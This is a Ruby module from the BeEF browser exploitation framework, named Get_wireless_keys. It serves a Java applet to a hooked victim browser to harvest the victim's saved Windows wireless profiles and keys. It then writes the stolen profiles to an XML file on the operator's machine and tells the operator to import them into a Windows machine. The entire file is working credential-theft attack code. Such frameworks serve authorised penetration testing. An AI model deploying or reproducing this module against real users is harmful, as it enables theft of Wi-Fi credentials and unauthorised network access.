#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_wireless_keys < BeEF::Core::Command
  
	def pre_send
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_wireless_keys/wirelessZeroConfig.jar','/wirelessZeroConfig','jar')
	end
  
	def post_execute
		content = {}
		content['result'] = @datastore['result'].to_s
		save content
		f = File.open("exported_wlan_profiles.xml","w+")
		f.write((@datastore['results']).sub("result=",""))
  		writeToResults = Hash.new
   		writeToResults['data'] = "Please import "+Dir.pwd+"/exported_wlan_profiles.xml into your windows machine"
		BeEF::Core::Models::Command.save_result(@datastore['beefhook'], @datastore['cid'] , @friendlyname, writeToResults)
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/wirelessZeroConfig.jar')
	end
  
end

